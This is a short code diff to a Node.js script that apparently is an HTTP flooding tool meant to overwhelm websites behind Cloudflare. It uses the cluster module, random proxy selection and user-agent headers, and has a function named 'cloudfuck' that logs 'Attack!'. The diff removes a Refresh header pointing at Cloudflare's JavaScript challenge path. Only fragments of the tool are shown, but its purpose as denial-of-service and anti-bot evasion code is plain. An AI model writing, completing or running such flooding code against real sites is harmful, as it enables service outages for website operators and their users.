@@ -2,7 +2,6 @@ const request = require('request');
 const cluster = require('cluster');
 const numCPUs = 2;
 
-const refresh = "8;URL=/cdn-cgi/l/chk_jschl";
 var proxies = []
 var proxi = proxies[Math.floor(Math.random()*proxies.length)];
 function cloudfuck(){
@@ -41,8 +40,7 @@ if (cluster.isMaster) {
 request.get({'url': url,'proxy': 'http://'+proxi}, function (error, response, body) {
   headers = {
  'User-Agent': agent,
- 'Referer': url,
- 'Refresh': refresh
+ 'Referer': url
   }
 console.log("Attack!")
 })
